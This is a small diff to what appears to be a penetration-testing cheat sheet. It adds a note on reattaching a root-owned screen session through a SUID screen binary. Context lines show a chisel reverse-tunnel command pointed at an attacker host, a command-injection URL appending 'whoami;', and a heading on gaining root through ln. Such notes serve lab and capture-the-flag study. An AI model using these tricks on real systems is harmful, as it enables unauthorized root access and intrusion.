@@ -214,6 +214,10 @@ On target machine `./chisel client <attacker>:<attacker_listening_port> R:localh
 
 Then `http://ip/page?a=whoami;`
 
+### Screen
+
+If there's a  deattached screen session running as root , we can re attach it only if screen binary has SUID bit `screen -r root/`
+
 ### Getting root with ln (symlink)
 
 If we have permissions to run /usr/bin/ln as root we can onw the machine
